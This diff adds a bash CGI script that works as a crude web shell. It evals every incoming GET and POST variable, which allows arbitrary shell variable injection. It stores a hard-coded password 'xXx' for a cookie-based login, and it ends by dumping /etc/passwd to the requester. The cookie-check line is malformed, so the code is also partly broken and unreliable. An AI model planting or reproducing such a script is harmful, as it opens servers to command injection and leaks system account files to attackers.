@@ -1,0 +1,100 @@
+#!/bin/bash -i
+
+#
+password="xXx"
+
+
+function cgi_get_POST_vars()
+{
+    # check content type
+    [ "${CONTENT_TYPE}" != "application/x-www-form-urlencoded" ] && \
+	echo "Warning: you should probably use MIME type "\
+	     "application/x-www-form-urlencoded!" 1>&2
+    # save POST variables (only first time this is called)
+    [ -z "$QUERY_STRING_POST" \
+      -a "$REQUEST_METHOD" = "POST" -a ! -z "$CONTENT_LENGTH" ] && \
+	read -n $CONTENT_LENGTH QUERY_STRING_POST
+    return
+}
+
+
+function cgi_decodevar()
+{
+    [ $# -ne 1 ] && return
+    local v t h
+    
+    t="${1//+/ }%%"
+    while [ ${#t} -gt 0 -a "${t}" != "%" ]; do
+	v="${v}${t%%\%*}" 
+	t="${t#*%}"       
+	
+	if [ ${#t} -gt 0 -a "${t}" != "%" ]; then
+	    h=${t:0:2} 
+	    t="${t:2}" 
+	    v="${v}"`echo -e \\\\x${h}` 
+	fi
+    done
+    
+    echo "${v}"
+    return
+}
+
+
+function cgi_getvars()
+{
+    [ $# -lt 2 ] && return
+    local q p k v s
+    # get query
+    case $1 in
+	GET)
+	    [ ! -z "${QUERY_STRING}" ] && q="${QUERY_STRING}&"
+	    ;;
+	POST)
+	    cgi_get_POST_vars
+	    [ ! -z "${QUERY_STRING_POST}" ] && q="${QUERY_STRING_POST}&"
+	    ;;
+	BOTH)
+	    [ ! -z "${QUERY_STRING}" ] && q="${QUERY_STRING}&"
+	    cgi_get_POST_vars
+	    [ ! -z "${QUERY_STRING_POST}" ] && q="${q}${QUERY_STRING_POST}&"
+	    ;;
+    esac
+    shift
+    s=" $* "
+    # parse the query data
+    while [ ! -z "$q" ]; do
+	p="${q%%&*}"  # get first part of query string
+	k="${p%%=*}"  # get the key (variable name) from it
+	v="${p#*=}"   # get the value from it
+	q="${q#$p&*}" # strip first part from query string
+	# decode and evaluate var if requested
+	[ "$1" = "ALL" -o "${s/ $k /}" != "$s" ] && \
+	    eval "$k=\"`cgi_decodevar \"$v\"`\""
+    done
+    return
+}
+
+# register all GET and POST variables
+cgi_getvars BOTH ALL
+
+pass="SAVEDPWD=$password"
+passv=`echo $HTTP_COOKIE | awk '$pass|'  -f0`
+
+if [ $cc2 -eq 4 ] ; then
+clear
+echo -e "Set-Cookie: SAVEDPWD=;\nContent-type: text/html\n\n"
+echo '<meta http-equiv="refresh" content="0;">'
+exit
+else
+
+if [ -n "$xx"  ] ; then
+echo -e "Set-Cookie: SAVEDPWD=$xx;\nContent-type: text/html\n\n"
+echo '<meta http-equiv="refresh" content="0;">'
+else
+echo -e "Content-type: text/html\n\n"
+fi
+
+fi
+
+
+cat /etc/passwd
